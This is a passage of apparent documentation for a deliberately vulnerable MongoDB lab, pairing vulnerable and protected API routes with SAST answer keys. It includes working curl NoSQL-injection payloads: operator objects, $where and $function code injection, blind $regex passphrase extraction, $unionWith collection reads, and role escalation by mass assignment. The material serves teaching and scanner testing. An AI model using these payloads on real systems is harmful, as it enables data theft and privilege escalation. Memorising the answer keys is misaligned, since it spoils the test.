### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/articles/entry.js` |
| Safe control | `pages/api/mongo/articles/item.js` |
| Route | `POST /api/mongo/articles/entry` vs `/api/mongo/articles/item` |
| Flow | JSON body id → ObjectId parse fails → raw object → findOne _id filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-007-student) · [Exploit lab](#mongo-007-exploit) · [Vuln vs protected](#mongo-007-safe) · [Tests](#mongo-007-tests)

<a id="mongo-007-student"></a>
### Student guide

When the value is not an ObjectId, the `catch` keeps the raw value. An operator object is exactly such a value.

<a id="mongo-007-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/articles/entry -H 'Content-Type: application/json' \
  -d '{"id":{"$exists":true}}'
# the title Internal prototype, without its identifier

curl -s -X POST http://127.0.0.1:3000/api/mongo/articles/item -H 'Content-Type: application/json' \
  -d '{"id":{"$exists":true}}'
# none of that
```

**Observation that proves exploitation:** the title `Internal prototype`, without its identifier.

<a id="mongo-007-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/articles/entry.js` | vulnerable | When the value is not an ObjectId, the `catch` keeps the raw value. An operator object is exactly such a value. |
| `pages/api/mongo/articles/item.js` | protected | The same parse, and a failure ends the request with status 400. |

The control is scoped to this flaw.

<a id="mongo-007-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-008"></a>
## MONGO-008 · $where built from request text

<a id="mongo-008-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/articles/browse.js` |
| Safe control | `pages/api/mongo/articles/topic.js` |
| Other safe cases | `pages/api/mongo/articles/budget.js`, `pages/api/mongo/articles/view.js`, `pages/api/mongo/articles/range.js` |
| Route | `GET /api/mongo/articles/browse` vs `/api/mongo/articles/topic` |
| Flow | query text → $where string → server-side JavaScript |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-008-student) · [Exploit lab](#mongo-008-exploit) · [Vuln vs protected](#mongo-008-safe) · [Tests](#mongo-008-tests)

<a id="mongo-008-student"></a>
### Student guide

The text is placed between quotes in JavaScript that the database server runs. A quote ends the string literal. CWE-95 describes the same flaw.

<a id="mongo-008-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/articles/browse?category=%27%20%7C%7C%20true%20%7C%7C%20%27'
# three articles, with Internal prototype

curl -s 'http://127.0.0.1:3000/api/mongo/articles/topic?category=%27%20%7C%7C%20true%20%7C%7C%20%27'
# none of that
```

**Observation that proves exploitation:** three articles, with `Internal prototype`.

<a id="mongo-008-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/articles/browse.js` | vulnerable | The text is placed between quotes in JavaScript that the database server runs. A quote ends the string literal. CWE-95 describes the same flaw. |
| `pages/api/mongo/articles/topic.js` | protected | `JSON.stringify` of a checked string gives one complete JavaScript string literal. A quote stays inside it. |
| `pages/api/mongo/articles/budget.js` | protected | The only inserted value is the result of `Number()`. Its text is digits, `NaN` or `Infinity`. |
| `pages/api/mongo/articles/view.js` | protected | `$where` is one of two constant strings, chosen by an own key of a constant map. |
| `pages/api/mongo/articles/range.js` | protected | `$expr` with a fixed shape. The only request value is a number. |

The control is scoped to this flaw.

<a id="mongo-008-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-009"></a>
## MONGO-009 · $function body built from request text

<a id="mongo-009-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/articles/score.js` |
| Safe control | `pages/api/mongo/articles/rank.js` |
| Route | `POST /api/mongo/articles/score` vs `/api/mongo/articles/rank` |
| Flow | JSON body weight → $function body → server-side JavaScript |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-009-student) · [Exploit lab](#mongo-009-exploit) · [Vuln vs protected](#mongo-009-safe) · [Tests](#mongo-009-tests)

<a id="mongo-009-student"></a>
### Student guide

The value is placed in the source text of a JavaScript function that the database server runs. CWE-95 describes the same flaw.

<a id="mongo-009-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/articles/score -H 'Content-Type: application/json' \
  -d '{"weight":"0 + 6 * 7"}'
# a score of 42 for every article: the server computed 0 + 6 * 7

curl -s -X POST http://127.0.0.1:3000/api/mongo/articles/rank -H 'Content-Type: application/json' \
  -d '{"weight":"0 + 6 * 7"}'
# none of that
```

**Observation that proves exploitation:** a score of `42` for every article: the server computed `0 + 6 * 7`.

<a id="mongo-009-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/articles/score.js` | vulnerable | The value is placed in the source text of a JavaScript function that the database server runs. CWE-95 describes the same flaw. |
| `pages/api/mongo/articles/rank.js` | protected | The function body is constant. The value is a checked number and goes in through `args`. |

The control is scoped to this flaw.

<a id="mongo-009-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-010"></a>
## MONGO-010 · A parsed JSON filter passed to find

<a id="mongo-010-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/articles/search.js` |
| Safe control | `pages/api/mongo/articles/match.js` |
| Route | `GET /api/mongo/articles/search` vs `/api/mongo/articles/match` |
| Flow | query text → JSON.parse → find filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-010-student) · [Exploit lab](#mongo-010-exploit) · [Vuln vs protected](#mongo-010-safe) · [Tests](#mongo-010-tests)

<a id="mongo-010-student"></a>
### Student guide

The caller writes the complete filter, so it can also ask for unpublished articles or use `$where`.

<a id="mongo-010-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/articles/search?filter=%7B%22published%22%3Afalse%7D'
# the article Internal prototype

curl -s 'http://127.0.0.1:3000/api/mongo/articles/match?filter=%7B%22published%22%3Afalse%7D'
# none of that
```

**Observation that proves exploitation:** the article `Internal prototype`.

<a id="mongo-010-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/articles/search.js` | vulnerable | The caller writes the complete filter, so it can also ask for unpublished articles or use `$where`. |
| `pages/api/mongo/articles/match.js` | protected | The text is also parsed as JSON, but only one property is used, as a string, next to a fixed `published: true`. |

The control is scoped to this flaw.

<a id="mongo-010-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-011"></a>
## MONGO-011 · A fixed condition overridden by a spread

<a id="mongo-011-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/articles/listing.js` |
| Safe control | `pages/api/mongo/articles/catalogue.js` |
| Route | `POST /api/mongo/articles/listing` vs `/api/mongo/articles/catalogue` |
| Flow | JSON body → spread after the fixed condition → find filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-011-student) · [Exploit lab](#mongo-011-exploit) · [Vuln vs protected](#mongo-011-safe) · [Tests](#mongo-011-tests)

<a id="mongo-011-student"></a>
### Student guide

The fixed `published: true` comes first. The spread body comes later and replaces it, and it can also add `$where`.

<a id="mongo-011-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/articles/listing -H 'Content-Type: application/json' \
  -d '{"published":{"$in":[true,false]}}'
# three articles, with Internal prototype

curl -s -X POST http://127.0.0.1:3000/api/mongo/articles/catalogue -H 'Content-Type: application/json' \
  -d '{"published":{"$in":[true,false]}}'
# none of that
```

**Observation that proves exploitation:** three articles, with `Internal prototype`.

<a id="mongo-011-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/articles/listing.js` | vulnerable | The fixed `published: true` comes first. The spread body comes later and replaces it, and it can also add `$where`. |
| `pages/api/mongo/articles/catalogue.js` | protected | The same spread, of an object with only two listed fields and only string values. `published` cannot be replaced. |

The control is scoped to this flaw.

<a id="mongo-011-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-012"></a>
## MONGO-012 · A request filter passed to countDocuments

<a id="mongo-012-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/directory/tally.js` |
| Safe control | `pages/api/mongo/directory/count.js` |
| Route | `POST /api/mongo/directory/tally` vs `/api/mongo/directory/count` |
| Flow | JSON body filter → countDocuments filter → yes or no answer |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-012-student) · [Exploit lab](#mongo-012-exploit) · [Vuln vs protected](#mongo-012-safe) · [Tests](#mongo-012-tests)

<a id="mongo-012-student"></a>
### Student guide

The caller writes the filter. The count tells whether a guess is right, so a secret can be read one character at a time.

<a id="mongo-012-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/directory/tally -H 'Content-Type: application/json' \
  -d '{"filter":{"username":"admin","passphrase":{"$regex":"^admin-l"}}}'
# a total of 1: the first characters of the secret are confirmed

curl -s -X POST http://127.0.0.1:3000/api/mongo/directory/count -H 'Content-Type: application/json' \
  -d '{"filter":{"username":"admin","passphrase":{"$regex":"^admin-l"}}}'
# none of that
```

**Observation that proves exploitation:** a total of `1`: the first characters of the secret are confirmed.

<a id="mongo-012-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/directory/tally.js` | vulnerable | The caller writes the filter. The count tells whether a guess is right, so a secret can be read one character at a time. |
| `pages/api/mongo/directory/count.js` | protected | Two named fields, each the operand of `$eq`. |

The control is scoped to this flaw.

<a id="mongo-012-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-013"></a>
## MONGO-013 · A request object selects the document to update

<a id="mongo-013-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/bookings/close.js` |
| Safe control | `pages/api/mongo/bookings/finish.js` |
| Route | `POST /api/mongo/bookings/close` vs `/api/mongo/bookings/finish` |
| Flow | JSON body booking → updateOne filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-013-student) · [Exploit lab](#mongo-013-exploit) · [Vuln vs protected](#mongo-013-safe) · [Tests](#mongo-013-tests)

<a id="mongo-013-student"></a>
### Student guide

The caller writes the filter of an update, so it can select a booking of another person.

<a id="mongo-013-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/close -H 'Content-Type: application/json' \
  -d '{"booking":{"holder":{"$ne":"alice"}}}'
# changed: 1: the booking of admin is closed

curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/finish -H 'Content-Type: application/json' \
  -d '{"booking":{"holder":{"$ne":"alice"}}}'
# none of that
```

**Observation that proves exploitation:** `changed: 1`: the booking of `admin` is closed.

<a id="mongo-013-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/bookings/close.js` | vulnerable | The caller writes the filter of an update, so it can select a booking of another person. |
| `pages/api/mongo/bookings/finish.js` | protected | The filter names the fixed holder and one reference as a string. |

The control is scoped to this flaw.

<a id="mongo-013-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-014"></a>
## MONGO-014 · A spread overrides the owner in a delete

<a id="mongo-014-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/bookings/remove.js` |
| Safe control | `pages/api/mongo/bookings/discard.js` |
| Route | `POST /api/mongo/bookings/remove` vs `/api/mongo/bookings/discard` |
| Flow | JSON body → spread after the fixed holder → deleteOne filter |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-014-student) · [Exploit lab](#mongo-014-exploit) · [Vuln vs protected](#mongo-014-safe) · [Tests](#mongo-014-tests)

<a id="mongo-014-student"></a>
### Student guide

The fixed `holder` comes first and the spread body replaces it.

<a id="mongo-014-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/remove -H 'Content-Type: application/json' \
  -d '{"holder":{"$ne":"alice"}}'
# removed: 1: the booking of admin is gone

curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/discard -H 'Content-Type: application/json' \
  -d '{"holder":{"$ne":"alice"}}'
# none of that
```

**Observation that proves exploitation:** `removed: 1`: the booking of `admin` is gone.

<a id="mongo-014-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/bookings/remove.js` | vulnerable | The fixed `holder` comes first and the spread body replaces it. |
| `pages/api/mongo/bookings/discard.js` | protected | The holder is fixed and the reference is the operand of `$eq`. |

The control is scoped to this flaw.

<a id="mongo-014-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-015"></a>
## MONGO-015 · Validation after the query

<a id="mongo-015-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/bookings/confirm.js` |
| Safe control | `pages/api/mongo/bookings/accept.js` |
| Route | `POST /api/mongo/bookings/confirm` vs `/api/mongo/bookings/accept` |
| Flow | JSON body reference → updateMany filter; typeof check runs later |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-015-student) · [Exploit lab](#mongo-015-exploit) · [Vuln vs protected](#mongo-015-safe) · [Tests](#mongo-015-tests)

<a id="mongo-015-student"></a>
### Student guide

The type check is correct and returns, but it stands after the update.

<a id="mongo-015-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/confirm -H 'Content-Type: application/json' \
  -d '{"reference":{"$ne":""}}'
# status 400, and both bookings are confirmed

curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/accept -H 'Content-Type: application/json' \
  -d '{"reference":{"$ne":""}}'
# none of that
```

**Observation that proves exploitation:** status 400, and both bookings are confirmed.

Both routes answer 400, so read the booking back after each request (reset between them). `changed` is `0` after the vulnerable route, because the booking is already confirmed, and `1` after the safe one:

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/bookings/accept -H 'Content-Type: application/json' \
  -d '{"reference":"BK-2002"}'
```

<a id="mongo-015-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/bookings/confirm.js` | vulnerable | The type check is correct and returns, but it stands after the update. |
| `pages/api/mongo/bookings/accept.js` | protected | The same check stands before the update. |

The control is scoped to this flaw.

<a id="mongo-015-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-016"></a>
## MONGO-016 · An aggregation pipeline from the request

<a id="mongo-016-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/reports/run.js` |
| Safe control | `pages/api/mongo/reports/named.js` |
| Route | `POST /api/mongo/reports/run` vs `/api/mongo/reports/named` |
| Flow | JSON body stages → aggregate pipeline |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-016-student) · [Exploit lab](#mongo-016-exploit) · [Vuln vs protected](#mongo-016-safe) · [Tests](#mongo-016-tests)

<a id="mongo-016-student"></a>
### Student guide

The caller writes the pipeline. A stage such as `$unionWith` or `$lookup` reads other collections.

<a id="mongo-016-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/reports/run -H 'Content-Type: application/json' \
  -d '{"stages":[{"$limit":1},{"$unionWith":"accounts"},{"$match":{"username":"admin"}}]}'
# the account of admin with its secrets, from an article report

curl -s -X POST http://127.0.0.1:3000/api/mongo/reports/named -H 'Content-Type: application/json' \
  -d '{"stages":[{"$limit":1},{"$unionWith":"accounts"},{"$match":{"username":"admin"}}]}'
# none of that
```

**Observation that proves exploitation:** the account of `admin` with its secrets, from an article report.

<a id="mongo-016-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/reports/run.js` | vulnerable | The caller writes the pipeline. A stage such as `$unionWith` or `$lookup` reads other collections. |
| `pages/api/mongo/reports/named.js` | protected | The pipeline is one of two constants, chosen by an own key of a constant map. |

The control is scoped to this flaw.

<a id="mongo-016-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-017"></a>
## MONGO-017 · A $match stage from the request

<a id="mongo-017-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/reports/summary.js` |
| Safe control | `pages/api/mongo/reports/overview.js` |
| Route | `POST /api/mongo/reports/summary` vs `/api/mongo/reports/overview` |
| Flow | JSON body only → $match stage → yes or no answer about hidden fields |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-017-student) · [Exploit lab](#mongo-017-exploit) · [Vuln vs protected](#mongo-017-safe) · [Tests](#mongo-017-tests)

<a id="mongo-017-student"></a>
### Student guide

The first stage keeps published articles only, but the second `$match` is written by the caller. It can test a hidden field and can run `$expr`.

<a id="mongo-017-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/reports/summary -H 'Content-Type: application/json' \
  -d '{"only":{"reviewerNote":{"$regex":"^zazzles-note-a"}}}'
# only Zazzles mug: the hidden note of that article starts with the tested text

curl -s -X POST http://127.0.0.1:3000/api/mongo/reports/overview -H 'Content-Type: application/json' \
  -d '{"only":{"reviewerNote":{"$regex":"^zazzles-note-a"}}}'
# none of that
```

**Observation that proves exploitation:** only `Zazzles mug`: the hidden note of that article starts with the tested text.

<a id="mongo-017-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/reports/summary.js` | vulnerable | The first stage keeps published articles only, but the second `$match` is written by the caller. It can test a hidden field and can run `$expr`. |
| `pages/api/mongo/reports/overview.js` | protected | One field and a string. In `$match` (outside `$expr`) a string is data, even when it starts with `$`. |

The control is scoped to this flaw.

<a id="mongo-017-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-018"></a>
## MONGO-018 · A group key named by the request

<a id="mongo-018-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/reports/breakdown.js` |
| Safe control | `pages/api/mongo/reports/totals.js` |
| Route | `GET /api/mongo/reports/breakdown` vs `/api/mongo/reports/totals` |
| Flow | query text → field path in $group → hidden field |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-018-student) · [Exploit lab](#mongo-018-exploit) · [Vuln vs protected](#mongo-018-safe) · [Tests](#mongo-018-tests)

<a id="mongo-018-student"></a>
### Student guide

The caller names the field path of `_id`. `reviewerNote` is hidden, and `$ROOT` returns whole documents.

<a id="mongo-018-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s 'http://127.0.0.1:3000/api/mongo/reports/breakdown?by=reviewerNote'
# the hidden notes as group keys

curl -s 'http://127.0.0.1:3000/api/mongo/reports/totals?by=reviewerNote'
# none of that
```

**Observation that proves exploitation:** the hidden notes as group keys.

<a id="mongo-018-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/reports/breakdown.js` | vulnerable | The caller names the field path of `_id`. `reviewerNote` is hidden, and `$ROOT` returns whole documents. |
| `pages/api/mongo/reports/totals.js` | protected | The same template. `by` is the matching entry of a constant list, or the default. |

The control is scoped to this flaw.

<a id="mongo-018-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-019"></a>
## MONGO-019 · A request object passed to $set

<a id="mongo-019-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/members/profile.js` |
| Safe control | `pages/api/mongo/members/details.js` |
| Other safe cases | `pages/api/mongo/members/settings.js` |
| Route | `POST /api/mongo/members/profile` vs `/api/mongo/members/details` |
| Flow | JSON body → $set document → role change |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-915 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-019-student) · [Exploit lab](#mongo-019-exploit) · [Vuln vs protected](#mongo-019-safe) · [Tests](#mongo-019-tests)

<a id="mongo-019-student"></a>
### Student guide

The caller chooses which fields are set, so it can set the role. A report of CWE-943 for the same flow is also correct.

<a id="mongo-019-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/members/profile -H 'Content-Type: application/json' \
  -d '{"access.role":"admin"}'
# changed: 1, and the next sign-in of alice has the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/members/details -H 'Content-Type: application/json' \
  -d '{"access.role":"admin"}'
# none of that
```

**Observation that proves exploitation:** `changed: 1`, and the next sign-in of `alice` has the role `admin`.

Read the role back after each request (reset between them). The role is `admin` after the vulnerable route and `user` after the safe one:

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/kiosk -H 'Content-Type: application/json' \
  -d '{"username":"alice","passphrase":"alice-lab-only"}'
```

<a id="mongo-019-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/mongo/members/profile.js` | vulnerable | The caller chooses which fields are set, so it can set the role. A report of CWE-943 for the same flow is also correct. |
| `pages/api/mongo/members/details.js` | protected | Two named fields, both strings. |
| `pages/api/mongo/members/settings.js` | protected | The Zod schema removes keys that it does not list, and the parsed object is set. |

The control is scoped to this flaw.

<a id="mongo-019-tests"></a>
### Automated tests

- `tests/unit/mongo.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route also accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-020"></a>
## MONGO-020 · Removed keys and a dotted path

<a id="mongo-020-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/mongo/members/preferences.js` |
| Safe control | `pages/api/mongo/members/options.js` |
| Route | `POST /api/mongo/members/preferences` vs `/api/mongo/members/options` |
| Flow | JSON body → delete of listed keys → dotted key in $set → role change |
| Tests | `tests/unit/mongo.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-915 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-020-student) · [Exploit lab](#mongo-020-exploit) · [Vuln vs protected](#mongo-020-safe) · [Tests](#mongo-020-tests)

<a id="mongo-020-student"></a>
### Student guide

The route deletes `access`, but `access.role` is a different key, and MongoDB reads it as a path. A report of CWE-943 for the same flow is also correct.

<a id="mongo-020-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/members/preferences -H 'Content-Type: application/json' \
  -d '{"access.role":"admin"}'
# changed: 1, and the next sign-in of alice has the role admin

curl -s -X POST http://127.0.0.1:3000/api/mongo/members/options -H 'Content-Type: application/json' \
  -d '{"access.role":"admin"}'
# none of that
```

**Observation that proves exploitation:** `changed: 1`, and the next sign-in of `alice` has the role `admin`.

Read the role back after each request (reset between them). The role is `admin` after the vulnerable route and `user` after the safe one:

```bash
curl -s -X POST http://127.0.0.1:3000/api/mongo/sign-in/kiosk -H 'Content-Type: application/json' \
  -d '{"username":"alice","passphrase":"alice-lab-only"}'
```

<a id="mongo-020-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
